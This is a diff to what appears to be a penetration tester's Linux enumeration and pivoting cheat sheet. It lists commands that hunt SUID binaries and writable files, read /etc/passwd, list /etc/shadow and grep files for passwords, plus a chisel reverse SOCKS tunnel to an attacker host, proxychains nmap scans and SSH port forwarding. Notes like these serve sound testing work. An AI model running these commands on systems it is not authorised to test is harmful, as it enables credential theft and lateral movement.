@@ -10,11 +10,13 @@ lsmod
 # files
 find / -perm /4000 2>/dev/null
 find / -writable -type d 2>/dev/null
+find / -writable -type f 2>/dev/null
 ls -la /etc/passwd /etc/shadow; cat /etc/passwd
 ls -la /opt /srv /home
+find /opt /srv /home -maxdepth 2
 ls -lah /etc/cron*; cat /etc/crontab
 find / -iname network-secret.txt 2>/dev/null
-find . -type f | grep -vE "(.js|.html)" | xargs grep -i "pass"
+find . -type f | grep -vE "(.js|.html|.css|node_modules)" | xargs grep -i "pass"
 
 # network
 netstat -tulpn || ss -tulpn
@@ -27,6 +29,7 @@ ls -la /etc/iptables/; cat /etc/iptables/*
 tcpdump -i tun0 icmp
 ./chisel_linux64 client kali-docker:9999 R:socks
 sudo proxychains nmap -v -sT -Pn --top-ports 1000 "$rhost"
+cssh -L 1234:127.0.0.1:5901 some_user@$rhost     # listen on port 1234 on kali and forward traffic to remote to 127.0.0.1 port 5901
 
 # user
 sudo -l
